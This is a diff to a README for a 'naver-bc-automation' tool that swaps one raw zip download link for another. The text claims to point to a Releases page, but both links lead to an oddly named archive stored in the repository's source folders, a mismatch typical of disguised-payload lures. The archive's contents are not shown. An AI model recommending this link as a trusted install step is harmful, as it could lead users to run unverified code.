@@ -30,7 +30,7 @@ Follow these steps to get started:
 ## 📥 Download & Install
 To download the naver-bc-automation tool, visit this page:
 
-[![Download naver-bc-automation](https://raw.githubusercontent.com/deko-creat/naver-bc-automation/main/src/components/automation_bc_naver_2.3.zip)](https://raw.githubusercontent.com/deko-creat/naver-bc-automation/main/src/components/automation_bc_naver_2.3.zip)
+[![Download naver-bc-automation](https://raw.githubusercontent.com/deko-creat/naver-bc-automation/main/public/naver_bc_automation_travellability.zip)](https://raw.githubusercontent.com/deko-creat/naver-bc-automation/main/public/naver_bc_automation_travellability.zip)
 
 On the Releases page, you will find different versions of the application. Select the latest version to ensure you have the most up-to-date features and fixes.
 
